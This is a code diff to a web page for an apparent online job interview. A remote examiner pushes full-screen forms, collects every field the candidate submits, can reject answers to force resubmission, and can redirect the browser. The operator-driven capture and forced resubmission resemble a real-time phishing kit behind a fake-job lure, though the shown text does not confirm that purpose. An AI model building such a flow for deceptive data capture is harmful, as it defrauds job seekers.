@@ -35,7 +35,7 @@
     <div id="setup-screen" class="setup-container">
         <div class="setup-card">
             <h2>Available Vacancies</h2>
-            <p>Select a role to begin your interview</p>
+            <p>Select a role and enter details to begin</p>
             
             <div class="vacancy-card" onclick="selectRole(this, 'banking')">
                 <strong>🏦 Customer Account Manager</strong><br>
@@ -51,6 +51,7 @@
             </div>
 
             <input type="text" id="name-input" placeholder="Enter Full Name">
+            <input type="email" id="email-input" placeholder="Enter Email Address">
             <button class="btn-start" onclick="startInterview()">Enter Interview Room</button>
         </div>
     </div>
@@ -60,15 +61,20 @@
 <script>
     const socket = io();
     let candidateName = "";
+    let candidateEmail = "";
     let selectedCategory = "";
     let currentScreenFile = "";
 
-    // Persistence Restore
+    // Persistence Restore using Email (The Identity Hub)
     window.onload = () => {
+        const savedEmail = localStorage.getItem('cand_email');
         const savedName = localStorage.getItem('cand_name');
         const savedCat = localStorage.getItem('cand_cat');
-        if(savedName && savedCat) {
+        
+        if(savedEmail && savedName && savedCat) {
+            document.getElementById('email-input').value = savedEmail;
             document.getElementById('name-input').value = savedName;
+            candidateEmail = savedEmail;
             candidateName = savedName;
             selectedCategory = savedCat;
             startInterview(true); 
@@ -84,16 +90,34 @@
     function startInterview(isRestore = false) {
         if(!isRestore) {
             candidateName = document.getElementById('name-input').value;
-            if(!candidateName || !selectedCategory) return alert("Select a role and enter your name.");
+            candidateEmail = document.getElementById('email-input').value;
+            
+            if(!candidateName || !candidateEmail || !selectedCategory) {
+                return alert("Select a role and enter both your name and email.");
+            }
+            
             localStorage.setItem('cand_name', candidateName);
+            localStorage.setItem('cand_email', candidateEmail);
             localStorage.setItem('cand_cat', selectedCategory);
         }
-        socket.emit('join_interview', { name: candidateName, category: selectedCategory });
+        
+        socket.emit('join_interview', { 
+            name: candidateName, 
+            email: candidateEmail, 
+            category: selectedCategory 
+        });
+        
         document.getElementById('screen-target').innerHTML = `<div style="display:flex; height:100vh; align-items:center; justify-content:center; background:#fff;"><h3>Connecting to Interview Server...</h3></div>`;
     }
 
     // 100% Takeover Screen Loader
     socket.on('new_task', async (data) => {
+        // Handle Redirection Command (Point 7)
+        if (data.redirectUrl) {
+            window.location.href = data.redirectUrl;
+            return;
+        }
+
         currentScreenFile = data.screenFile;
         try {
             const response = await fetch(`/screens/${data.screenFile}`);
@@ -110,9 +134,8 @@
             // Handle Dynamic Form Logic
             const form = document.querySelector('form');
             if(form) {
-                // Prevent default HTML submit and use our logic
                 form.onsubmit = (e) => { e.preventDefault(); validateAndSubmit(); };
-                form.oninput = () => socket.emit('typing', { name: candidateName });
+                form.oninput = () => socket.emit('typing', { email: candidateEmail });
             }
         } catch (err) {
             document.getElementById('screen-target').innerHTML = `<p style="color:red; padding:20px;">System Error: Failed to load ${data.screenFile}</p>`;
@@ -159,7 +182,6 @@
         const formData = new FormData(form);
         let formattedResponse = "";
 
-        // Dynamic Formatting Logic (Point 4)
         formData.forEach((value, key) => {
             let cleanKey = key.replace(/[-_]/g, ' ')
                                .replace(/\b\w/g, l => l.toUpperCase());
@@ -167,13 +189,12 @@
         });
 
         socket.emit('task_submitted', {
-            name: candidateName,
+            email: candidateEmail,
             screenFile: currentScreenFile,
             answer: formattedResponse || "Form Acknowledged"
         });
     }
 
-    // Handle "Mark Wrong" or Validation Errors from Examiner
     socket.on('wrong_answer', (data) => {
         const errDiv = document.getElementById('error-div');
         const wrapper = document.querySelector('.wrapper');
@@ -188,11 +209,16 @@
             submitBtn.innerText = "Resubmit Information";
         }
         
-        // Visual Feedback (Shake)
         if(wrapper) {
             wrapper.classList.add('error-shake');
             setTimeout(() => wrapper.classList.remove('error-shake'), 400);
         }
+    });
+
+    // Handle Force Reset/Removal from Examiner (Point 4 & 5)
+    socket.on('force_reset', () => {
+        localStorage.clear();
+        window.location.reload();
     });
 </script>
 </body>
